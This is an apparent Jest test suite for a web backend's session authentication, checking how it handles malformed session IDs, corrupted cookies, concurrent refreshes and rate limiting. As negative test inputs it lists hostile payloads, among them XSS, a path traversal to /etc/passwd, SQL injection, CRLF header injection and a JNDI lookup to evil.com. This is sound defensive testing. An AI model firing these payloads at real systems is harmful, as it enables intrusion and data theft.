import { TestClient, waitForService, extractUserCredentialsFromLogs } from '../utils/test-utils';

describe('Session Authentication Error Handling', () => {
  let client: TestClient;
  let userCredentials: { email: string; password: string } | null = null;

  beforeAll(async () => {
    client = new TestClient();

    try {
      await waitForService(client);
      userCredentials = await extractUserCredentialsFromLogs();
    } catch (error) {
      console.log('❌ Backend service is not available. Ensure the Docker environment is running.');
      throw error;
    }
  }, 60000);

  afterEach(async () => {
    client.clearAuth();
  });

  describe('Invalid Session ID Scenarios', () => {
    it('should handle refresh with malformed session ID', async () => {
      const malformedSessionIds = [
        '', // Empty string
        ' ', // Whitespace only
        'null', // String null
        'undefined', // String undefined
        '123', // Too short
        'a'.repeat(100), // Too long
        'invalid-session-format', // Wrong format
        'session with spaces', // Contains spaces
        'session/with/slashes', // Contains slashes
        'session%20encoded', // URL encoded
        '<script>alert(1)</script>', // XSS attempt
        '../../../etc/passwd', // Path traversal
        '${process.env.SECRET}', // Template injection
      ];

      for (const sessionId of malformedSessionIds) {
        const response = await client.refreshToken(sessionId);

        // 404 might be valid for some malformed session IDs (like path traversal)
        // 401 is expected for authentication issues
        expect([401, 404]).toContain(response.status);

        if (response.status === 401) {
          expect(response.data).toHaveProperty('error');
        }
      }
    });

    it('should handle logout with malformed session ID', async () => {
      const malformedSessionIds = [
        '', // Empty string
        'nonexistent-session',
        'session with spaces',
        '../invalid',
        'null',
      ];

      for (const sessionId of malformedSessionIds) {
        // Should handle gracefully without throwing
        const response = await client.logout(sessionId);
        // Backend should respond appropriately, local state should be cleared
        expect(client.getCurrentSession()).toBeNull();
        expect(client.getCookies().size).toBe(0);
      }
    });

    it('should handle expired session ID scenarios', async () => {
      if (!userCredentials) {
        throw new Error('No user credentials available for testing');
      }

      // Login and get a valid session
      const loginResponse = await client.login(userCredentials);
      expect(loginResponse).toBeHttpStatus(200);
      const sessionId = (loginResponse.data as any).session;

      // Logout to invalidate the session
      await client.logout(sessionId);

      // Try to use the now-invalid session
      const refreshResponse = await client.refreshToken(sessionId);
      expect(refreshResponse).toBeHttpStatus(401);

      const apiResponse = await client.get(['api', 'lists']);
      expect(apiResponse).toBeHttpStatus(401);
    });
  });

  describe('Missing Cookie Scenarios', () => {
    it('should handle refresh without required cookies', async () => {
      if (!userCredentials) {
        throw new Error('No user credentials available for testing');
      }

      // Login to get a session
      const loginResponse = await client.login(userCredentials);
      expect(loginResponse).toBeHttpStatus(200);

      if ('error' in loginResponse.data) {
        throw new Error(loginResponse.data.error);
      }

      const sessionId = loginResponse.data.session;

      // Clear cookies manually (simulating cookie deletion/expiry)
      client.clearCookies();

      // Try to refresh without cookies
      const refreshResponse = await client.refreshToken(sessionId);
      expect(refreshResponse).toBeHttpStatus(401);
      expect(refreshResponse.data).toHaveProperty('error');
    });

    it('should handle partial cookie corruption', async () => {
      if (!userCredentials) {
        throw new Error('No user credentials available for testing');
      }

      // Login to get valid cookies
      const loginResponse = await client.login(userCredentials);
      expect(loginResponse).toBeHttpStatus(200);

      if ('error' in loginResponse.data) {
        throw new Error(loginResponse.data.error);
      }

      const sessionId = loginResponse.data.session;

      // Corrupt the refresh token cookie
      client.getCookies().forEach((value, name) => {
        if (name.includes('__miauflix_rt_')) {
          client.setCookie(name, 'corrupted-cookie-value');
        }
      });

      // Try to refresh with corrupted cookie
      const refreshResponse = await client.refreshToken(sessionId);
      expect(refreshResponse).toBeHttpStatus(401);
    });

    it('should handle cookie-session mismatch', async () => {
      if (!userCredentials) {
        throw new Error('No user credentials available for testing');
      }

      const client1 = new TestClient();
      const client2 = new TestClient();

      // Create two separate sessions
      await Promise.all([client1.login(userCredentials), client2.login(userCredentials)]);

      const session1 = client1.getCurrentSession()!;
      const session2 = client2.getCurrentSession()!;

      // Use session1 ID with session2 cookies
      const cookies2 = client2.getCookies();
      client1.clearCookies();
      cookies2.forEach((value, name) => {
        client1.setCookie(name, value);
      });

      // This should fail due to cookie-session mismatch
      const refreshResponse = await client1.refreshToken(session1);
      expect(refreshResponse).toBeHttpStatus(401);

      // Cleanup
      await Promise.all([client1.logout().catch(() => {}), client2.logout().catch(() => {})]);
    });
  });

  describe('Network Error Handling', () => {
    it('should handle concurrent refresh attempts with same session', async () => {
      if (!userCredentials) {
        throw new Error('No user credentials available for testing');
      }

      // Login once
      const loginResponse = await client.login(userCredentials);
      expect(loginResponse).toBeHttpStatus(200);

      if ('error' in loginResponse.data) {
        throw new Error(loginResponse.data.error);
      }

      const sessionId = loginResponse.data.session;

      // Clear access token to force refresh
      client.setAuthToken('');

      // Make concurrent refresh requests (potential race condition)
      const refreshPromises = Array(5)
        .fill(null)
        .map(() => client.refreshToken(sessionId));

      const results = await Promise.all(refreshPromises);

      // At least one should succeed, others might fail due to token rotation
      const successful = results.filter(r => r.status === 200);
      const failed = results.filter(r => r.status !== 200);

      expect(successful.length).toBeGreaterThanOrEqual(1);

      // Failed requests should have proper error handling
      failed.forEach(result => {
        expect(result.data).toHaveProperty('error');
      });
    });

    it('should handle refresh after forced session invalidation', async () => {
      if (!userCredentials) {
        throw new Error('No user credentials available for testing');
      }

      const client1 = new TestClient();
      const client2 = new TestClient();

      // Login with same credentials on both clients
      await Promise.all([client1.login(userCredentials), client2.login(userCredentials)]);

      const session1 = client1.getCurrentSession()!;
      const session2 = client2.getCurrentSession()!;

      // Force logout session1 while client2 is still active
      await client1.logout(session1);

      // Try to use session1 after logout (should fail)
      const invalidRefresh = await client1.refreshToken(session1);
      expect(invalidRefresh).toBeHttpStatus(401);

      // Session2 should still work
      const validRefresh = await client2.refreshToken(session2);
      expect(validRefresh).toBeHttpStatus(200);

      // Cleanup
      await client2.logout().catch(() => {});
    });
  });

  describe('Authentication State Edge Cases', () => {
    it('should handle login attempts while already logged in', async () => {
      if (!userCredentials) {
        throw new Error('No user credentials available for testing');
      }

      // First login
      const loginResponse1 = await client.login(userCredentials);
      expect(loginResponse1).toBeHttpStatus(200);

      if ('error' in loginResponse1.data) {
        throw new Error(loginResponse1.data.error);
      }

      const session1 = loginResponse1.data.session;

      // Second login with same client (should create new session)
      const loginResponse2 = await client.login(userCredentials);
      expect(loginResponse2).toBeHttpStatus(200);

      if ('error' in loginResponse2.data) {
        throw new Error(loginResponse2.data.error);
      }

      const session2 = loginResponse2.data.session;

      // Sessions should be different
      expect(session1).not.toBe(session2);

      // Both sessions should be valid initially
      const api1 = await client.get(['api', 'lists']);
      expect(api1).toBeHttpStatus(200);

      // Current session should be session2
      expect(client.getCurrentSession()).toBe(session2);
    });

    it('should handle logout of non-current session', async () => {
      if (!userCredentials) {
        throw new Error('No user credentials available for testing');
      }

      // Login twice to create two sessions
      const loginResponse1 = await client.login(userCredentials);
      expect(loginResponse1).toBeHttpStatus(200);

      if ('error' in loginResponse1.data) {
        throw new Error(loginResponse1.data.error);
      }

      const session1 = loginResponse1.data.session;

      const loginResponse2 = await client.login(userCredentials);
      expect(loginResponse2).toBeHttpStatus(200);

      if ('error' in loginResponse2.data) {
        throw new Error(loginResponse2.data.error);
      }

      const session2 = loginResponse2.data.session;

      // Current session should be session2
      expect(client.getCurrentSession()).toBe(session2);

      // Logout session1 (not current session)
      const logoutResponse = await client.logout(session1);

      // Logout should succeed (backend handles it)
      // Current session should remain session2
      expect(client.getCurrentSession()).toBe(session2);

      // Current session should still work
      const apiResponse = await client.get(['api', 'lists']);
      expect(apiResponse).toBeHttpStatus(200);
    });

    it('should handle multiple logout attempts on same session', async () => {
      if (!userCredentials) {
        throw new Error('No user credentials available for testing');
      }

      // Login
      const loginResponse = await client.login(userCredentials);
      expect(loginResponse).toBeHttpStatus(200);

      if ('error' in loginResponse.data) {
        throw new Error(loginResponse.data.error);
      }

      const sessionId = loginResponse.data.session;

      // First logout
      const logout1 = await client.logout(sessionId);
      expect(logout1).toBeHttpStatus(200);

      // Second logout on same session (should be handled gracefully)
      const logout2 = await client.logout(sessionId);
      // Should either succeed silently or return appropriate error
      expect([200, 401, 404]).toContain(logout2.status);
    });
  });

  describe('Malicious Request Handling', () => {
    it('should handle session injection attempts', async () => {
      const maliciousSessionIds = [
        'admin-session-123',
        'root-session',
        'system-session',
        '../../admin/session',
        'session"; DROP TABLE sessions; --',
        '${jndi:ldap://evil.com/a}',
        'session\x00null',
        'session\r\n\r\nHTTP/1.1 200 OK',
      ];

      for (const sessionId of maliciousSessionIds) {
        const response = await client.refreshToken(sessionId);

        // 404 might be valid for some malicious session IDs (like HTTP injection)
        // 401 is expected for authentication issues
        expect([401, 404]).toContain(response.status);

        if (response.status === 401) {
          expect(response.data).toHaveProperty('error');
        }
      }
    });

    it('should handle cookie injection attempts', async () => {
      if (!userCredentials) {
        throw new Error('No user credentials available for testing');
      }

      // Login to get a valid session
      const loginResponse = await client.login(userCredentials);
      expect(loginResponse).toBeHttpStatus(200);

      if ('error' in loginResponse.data) {
        throw new Error(loginResponse.data.error);
      }

      const sessionId = loginResponse.data.session;

      // Inject malicious cookies
      client.setCookie('admin', 'true');
      client.setCookie('role', 'administrator');
      client.setCookie('bypass_auth', '1');
      client.setCookie('refresh_token_admin', 'fake-admin-token');

      // Try to refresh - should only use legitimate refresh token
      const refreshResponse = await client.refreshToken(sessionId);
      expect(refreshResponse).toBeHttpStatus(200);

      // Response should not be affected by injected cookies
      expect((refreshResponse.data as any).user.role).toBe('admin'); // Legitimate role from DB
    });

    it('should handle oversized cookie values', async () => {
      if (!userCredentials) {
        throw new Error('No user credentials available for testing');
      }

      // Login to get valid session
      const loginResponse = await client.login(userCredentials);
      expect(loginResponse).toBeHttpStatus(200);

      if ('error' in loginResponse.data) {
        throw new Error(loginResponse.data.error);
      }

      const sessionId = loginResponse.data.session;

      // Set oversized cookie value (simulate cookie bomb)
      const largeValue = 'x'.repeat(10000);
      client.setCookie(`__miauflix_rt_${sessionId}`, largeValue);

      // Should handle gracefully
      const refreshResponse = await client.refreshToken(sessionId);
      expect(refreshResponse).toBeHttpStatus(401);
    });
  });

  describe('Error Response Format Validation', () => {
    it('should return consistent error format for authentication failures', async () => {
      const scenarios = [
        () => client.refreshToken('invalid-session'),
        () => client.logout('invalid-session'),
        () => client.get(['api', 'lists']), // Without auth
      ];

      for (const scenario of scenarios) {
        const response = await scenario();

        if (response.status === 401) {
          // Should have consistent error structure
          expect(response.data).toHaveProperty('error');
          expect(typeof (response.data as any).error).toBe('string');

          // Should include helpful error messages
          expect((response.data as any).error.length).toBeGreaterThan(0);
        }
      }
    });

    it('should not leak sensitive information in error messages', async () => {
      if (!userCredentials) {
        throw new Error('No user credentials available for testing');
      }

      // Test various error scenarios
      const scenarios = [
        () => client.refreshToken('invalid-session-id'),
        () => client.login({ email: 'nonexistent@example.com', password: 'wrong' }, false),
      ];

      for (const scenario of scenarios) {
        const response = await scenario();

        if (response.status >= 400) {
          const errorMessage = JSON.stringify(response.data).toLowerCase();

          // Should not contain sensitive information
          expect(errorMessage).not.toContain('password');
          expect(errorMessage).not.toContain('secret');
          expect(errorMessage).not.toContain('jwt_secret');
          expect(errorMessage).not.toContain('private_key');
          expect(errorMessage).not.toContain('database');
          expect(errorMessage).not.toContain('sql');
          expect(errorMessage).not.toContain('internal');
          expect(errorMessage).not.toContain('debug');
          // Should not contain actual token values (long strings that look like tokens)
          expect(errorMessage).not.toMatch(/[a-zA-Z0-9_-]{20,}/); // No long token-like strings
        }
      }
    });
  });

  describe('Rate Limiting Error Scenarios', () => {
    it('should handle rate limiting gracefully on failed login attempts', async () => {
      const invalidCredentials = {
        email: 'attacker@example.com',
        password: 'wrongpassword',
      };

      // Make rapid failed login attempts
      const attempts = [];
      for (let i = 0; i < 10; i++) {
        attempts.push(
          client.post(
            ['api', 'auth', 'login'],
            { json: invalidCredentials },
            { headers: { 'X-Force-RateLimit': 'true' } }
          )
        );
      }

      const responses = await Promise.all(attempts);

      // Should have some rate limited responses
      const rateLimited = responses.filter(r => r.status === 429);
      expect(rateLimited.length).toBeGreaterThan(0);

      // Rate limited responses should have appropriate error structure
      rateLimited.forEach(response => {
        // Rate limit responses come as plain text, parsed into { message: "..." }
        expect(response.data).toHaveProperty('message');
        expect((response.data as any).message).toMatch(/too many requests/i);
      });
    });

    it('should handle rate limiting on refresh endpoints', async () => {
      if (!userCredentials) {
        throw new Error('No user credentials available for testing');
      }

      // Login to get valid session
      const loginResponse = await client.login(userCredentials);
      expect(loginResponse).toBeHttpStatus(200);

      if ('error' in loginResponse.data) {
        throw new Error(loginResponse.data.error);
      }

      const sessionId = loginResponse.data.session;

      // Make rapid refresh attempts to trigger rate limiting
      const attempts = [];
      for (let i = 0; i < 15; i++) {
        // Use direct fetch with rate limiting header
        const baseURL = global.BACKEND_URL.replace(/\/$/, '');
        const cookieHeader = Array.from(client.getCookies().entries())
          .map(([name, value]) => `${name}=${value}`)
          .join('; ');

        attempts.push(
          fetch(`${baseURL}/api/auth/refresh/${sessionId}`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              Origin: baseURL,
              Cookie: cookieHeader,
              'X-Force-RateLimit': 'true',
            },
            credentials: 'include',
          }).then(async response => {
            const text = await response.text();
            let data;
            try {
              data = JSON.parse(text);
            } catch {
              data = { message: text };
            }
            return {
              status: response.status,
              data,
              headers: Object.fromEntries(response.headers.entries()),
            };
          })
        );
      }

      const responses = await Promise.all(attempts);

      // Should have some rate limited responses
      const rateLimited = responses.filter(r => r.status === 429);
      expect(rateLimited.length).toBeGreaterThan(0);

      // Rate limited responses should have appropriate message
      rateLimited.forEach(response => {
        // Rate limit responses come as plain text, parsed into { message: "..." }
        expect(response.data).toHaveProperty('message');
        expect((response.data as any).message).toMatch(/too many requests/i);
      });
    });
  });
});
